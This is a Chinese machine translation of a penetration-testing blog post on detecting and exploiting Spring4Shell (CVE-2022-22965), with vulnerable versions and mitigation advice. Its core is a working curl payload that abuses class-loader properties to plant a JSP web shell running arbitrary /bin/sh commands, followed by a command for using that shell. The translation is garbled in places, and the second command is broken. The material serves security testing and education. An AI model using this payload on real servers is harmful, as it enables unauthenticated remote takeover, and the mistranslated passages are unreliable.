<html>
<head>
<title>How to manually detect and exploit Spring4Shell (CVE-2022-22965) | Pentest-Tools.com</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1>如何手动检测和利用spring 4 shell(CVE-2022-22965)| Pentest-Tools.com</h1>
<blockquote>原文：<a href="https://pentest-tools.com/blog/detect-exploit-spring4shell-cve-2022-22965#2022-07-11T11:25:13.000Z">https://pentest-tools.com/blog/detect-exploit-spring4shell-cve-2022-22965#2022-07-11T11:25:13.000Z</a></blockquote><div><div class="article mt-8">
          
            
          

          <div class="prose prose-headings:break-words prose-img:rounded-md prose-img:ring-1 prose-img:ring-dark-blue-200 prose-img:ring-opacity-30 prose-code:break-words prose-headings:[scroll-margin-top:120px] xl:prose-lg xl:prose-headings:w-[628px] xl:prose-p:w-[628px]">
            
              
                
                  <p>就在Log4Shell残酷地震撼了我们的世界几个月后，当一切开始看起来平静祥和的时候，上帝释放出了我们的脆弱。一个流行的Java框架中的另一个类似命名的漏洞——<strong>spring 4 shell</strong>—被曝光。</p><p>CVE-2022-22965和它(稍微)年长的兄弟姐妹一样危险和广泛吗？请继续关注我们，一探究竟！</p><h2 id="what-is-spring4shell"><strong>什么是Spring4Shell？</strong></h2><p>Spring4Shell或<a target="_blank" rel="external nofollow noopener noreferrer" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965"> CVE-2022-22965 </a>是Java Spring框架中的一个远程代码执行漏洞，它是由将用户控制的值传递给Spring的类加载器的各种属性的能力引起的。这使得未经验证的远程攻击者有可能注入web外壳并获得RCE。</p><h2 id="how-spring4shell-works">【Spring4Shell如何工作</h2><p>如前所述，您需要摆弄类加载器，并达到您可以<strong>成功地将web shell注入目标系统</strong>的程度。根据在Spring框架上运行的应用程序，可能有不同的方法来利用这个漏洞。</p><p>目前，大多数Apache Tomcat服务器似乎都以各种已发布的POC为目标。这就是为什么我们现在将继续描述我们的同事<a href="https://pentest-tools.com/blog/authors/pentest-iulian"> Iulian </a>如何开发针对Apache Tomcat web服务器的<a target="_blank" rel="noopener noreferrer" href="https://pentest-tools.com/exploit-helpers/sniper#exploit-modules">漏洞利用模块</a>，帮助您获得漏洞验证。</p><p>这个想法是使用类加载器来覆盖日志功能中的关键属性，这将导致<strong>日志记录器创建一个web shell而不是日志文件</strong>。</p><p>这些属性如下:</p><ol start="1"><li><p><code>class.module.classLoader.resources.context.parent.pipeline.first.pattern</code>。这决定了日志文件的内容。这里是您想要放置web shell代码的地方。</p></li><li><p><code>class.module.classLoader.resources.context.parent.pipeline.first.prefix</code>。前缀是指日志文件的名称。这里是您命名web shell文件的地方。</p></li><li><p><code>class.module.classLoader.resources.context.parent.pipeline.first.suffix</code>。后缀表示日志文件的扩展名。这个必须是. jsp。</p></li><li><p><code>class.module.classLoader.resources.context.parent.pipeline.first.directory</code>。directory属性确定日志文件的位置。如果可以远程访问根目录，可以使用webapps/ROOT作为directory属性的值，并且应该能够通过访问/与web shell进行交互。jsp</p></li><li><p><code>class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat</code>。这是可选的，它有助于提高攻击者的生活质量，因为如果该属性为空，它会从输出中删除繁琐的日志时间戳。</p></li></ol><h2 id="business-impact-of-cve-2022-22965"><strong>CVE的业务影响-2022-22965 </strong></h2><p>成功利用Spring4Shell后，未经验证的远程攻击者可以获得对目标的控制，并危及整个底层系统的安全。</p><p>虽然这听起来像是可怕的事情，就像是Log4Shell的重演，但请记住，互联网上流传的POC将部署在Tomcat上的易受攻击的应用程序作为WAR，这是<strong>而不是</strong>默认配置。</p><p>这让我相信易受攻击的目标不会像在<a href="https://pentest-tools.com/blog/log4shell-scanner-detect-cve-2021-44228"> Log4Shell </a>中那样容易被发现。</p><p>然而，整个安全社区已经无数次证明，它充满了聪明能干的头脑，能够找出甚至是最不可想象的利用方法。</p><p>因此，即使您不运行上述特定配置，<strong>请考虑更新到下面列出的一个修补版本</strong>。</p><h2 id="how-to-manually-detect-spring4shell-in-ethical-hacking-engagements"><strong>如何在道德黑客活动中手动检测spring 4 shell</strong></h2><p>这里有一个curl命令，您可以使用它将web shell上传到易受攻击的目标。它遵循“Spring4Shell如何工作”一节中描述的5个步骤，并包含以下内容:</p><ul><li><p>模式中的web shell代码</p></li><li><p>的。后缀中的jsp扩展名</p></li><li><p>目录属性中的webapps/ROOT根目录</p></li><li><p>前缀中的webshell_name</p></li><li><p>文件日期格式为空。</p></li></ul>

                

                
              
                
                  <div class="not-prose my-10">
                    

<div x-data="{   activeTab: 'curl',   copied: false,    setActiveTab(tab) {     this.activeTab = tab   },   async copyCode() {     const code = this.$refs[`code-${this.activeTab}`]      if (!code) return     if (!code.textContent) return      await navigator.clipboard.writeText(code.textContent.trim())     this.copied = true     await new Promise((resolve) =&gt; setTimeout(resolve, 1000))     this.copied = false   }, }" class="not-prose code-block-group relative z-10 -mx-6 flex max-w-2xl flex-col sm:mx-0 xl:sticky xl:top-26 xl:h-auto xl:max-h-128">
  <div class="relative flex h-full overflow-hidden bg-[#011627] shadow-2xl shadow-dark-blue-300 sm:rounded-xl">
    <div class="relative flex w-full flex-col">
      

      <div class="relative z-10 flex min-h-0 flex-auto flex-col border-t border-white border-opacity-10">
        

        <div class="group flex min-h-0 flex-auto flex-col">
          <div x-show="'curl' === activeTab" class="code-block relative flex min-h-0 w-full flex-auto flex-col">
  <p aria-hidden="true" class="absolute inset-y-0 left-0 z-10 w-12 bg-[#00111f]"/>

  <div x-ref="code-curl" class="content-highlight h-full min-h-0 flex-auto overflow-auto">
    <pre class="shiki"><code><span class="line"><span>curl -H </span><span>"</span><span>prefix</span><span>"</span><span>:</span><span>"</span><span>&lt;%</span><span>"</span><span> -H </span><span>"</span><span>suffix</span><span>"</span><span>:</span><span>"</span><span>%&gt;//</span><span>"</span><span> -H </span><span>"</span><span>c</span><span>"</span><span>:</span><span>"</span><span>Runtime</span><span>"</span><span> -H</span></span>
<span class="line"><span>"</span><span>Content-Type</span><span>"</span><span>:</span><span>"</span><span>application/x-www-form-urlencoded</span><span>"</span><span> -d</span></span>
<span class="line"><span>'</span><span>class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(new String[]{%22/bin/sh%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=&lt;webshell_name&gt;&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</span><span>'</span><span> http://127.0.0.1:</span><span>&lt;</span><span>port</span><span>&gt;</span><span>/</span><span>&lt;</span><span>path</span><span>&gt;</span></span></code></pre>
  </div>

  
</div>
        </div>
      </div>
    </div>
  </div>
</div>

                  </div>

                

                
              
                
                  <p>一旦web shell上传到根目录，您就可以访问它并提供带有以下GET请求的命令:</p>

                

                
              
                
                  <div class="not-prose my-10">
                    

<div x-data="{   activeTab: 'curl',   copied: false,    setActiveTab(tab) {     this.activeTab = tab   },   async copyCode() {     const code = this.$refs[`code-${this.activeTab}`]      if (!code) return     if (!code.textContent) return      await navigator.clipboard.writeText(code.textContent.trim())     this.copied = true     await new Promise((resolve) =&gt; setTimeout(resolve, 1000))     this.copied = false   }, }" class="not-prose code-block-group relative z-10 -mx-6 flex max-w-2xl flex-col sm:mx-0 xl:sticky xl:top-26 xl:h-auto xl:max-h-128">
  <div class="relative flex h-full overflow-hidden bg-[#011627] shadow-2xl shadow-dark-blue-300 sm:rounded-xl">
    <div class="relative flex w-full flex-col">
      

      <div class="relative z-10 flex min-h-0 flex-auto flex-col border-t border-white border-opacity-10">
        

        <div class="group flex min-h-0 flex-auto flex-col">
          <div x-show="'curl' === activeTab" class="code-block relative flex min-h-0 w-full flex-auto flex-col">
  <p aria-hidden="true" class="absolute inset-y-0 left-0 z-10 w-12 bg-[#00111f]"/>

  <div x-ref="code-curl" class="content-highlight h-full min-h-0 flex-auto overflow-auto">
    <pre class="shiki"><code><span class="line"><span>curl http://127.0.0.1:/.jsp</span><span>?</span><span>cmd=</span><span>&lt;</span><span>commands</span><span>&gt;</span></span></code></pre>
  </div>

  
</div>
        </div>
      </div>
    </div>
  </div>
</div>

                  </div>

                

                
              
                
                  <h2 id="vulnerable-spring-versions"><strong>易受攻击的Spring版本</strong></h2><div class="flex flex-col"><div class="-mx-4 -my-2 overflow-x-auto sm:-mx-6"><div class="inline-block min-w-full py-2 align-middle sm:px-6"><div class="border border-gray-200 bg-white overflow-hidden shadow sm:rounded-lg"><table class="min-w-full divide-y divide-gray-200"><thead><tr><th colspan="1" rowspan="1">产品名称</th><th colspan="1" rowspan="1">易受攻击版本</th><th colspan="1" rowspan="1">范围</th></tr></thead><tr><td colspan="1" rowspan="1">弹簧框架</td><td colspan="1" rowspan="1">5.3.x</td><td colspan="1" rowspan="1">5.3.0 – 5.3.17</td></tr><tr><td colspan="1" rowspan="1">弹簧框架</td><td colspan="1" rowspan="1">5.2.x</td><td colspan="1" rowspan="1">5.2.0 – 5.2.19</td></tr></table></div></div></div></div><h2 id="how-to-mitigate-cve-2022-22965"><strong>如何缓解CVE-2022-22965 </strong></h2><p>运行5.3.x易受攻击版本的Spring Framework用户应立即升级到5.3.18或更新版本，而运行5.2.x版本的用户应至少升级到5.2.20。</p><h2 id="spring4shell-estimated-impact-and-the-bigger-picture"><strong> Spring4Shell预计影响和大局</strong></h2><p>全球有<a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.checkpoint.com/2022/04/05/16-of-organizations-worldwide-impacted-by-spring4shell-zero-day-vulnerability-exploitation-attempts-since-outbreak/"> 16%的组织</a>受到Spring4Shell RCE漏洞的影响，估计有<strong> 28%的组织来自软件行业</strong>，识别和修补业务关键资产仍然是当务之急。</p><p>像Spring4Shell和<a href="https://pentest-tools.com/blog/how-we-detect-log4shell"> Log4Shell </a>这样的高风险漏洞提醒我们，如果没有主动的安全评估、多层安全和渗透到团队和角色的意识培训，技术生态系统是多么脆弱。</p><p>如果您喜欢这个技术指南，并且更好地理解了这个CVE的细节，请相信我们会在下面的文章中介绍更多的细节。</p>

                

                
              
            
          </div>
        </div>
      </div>    
</body>
</html>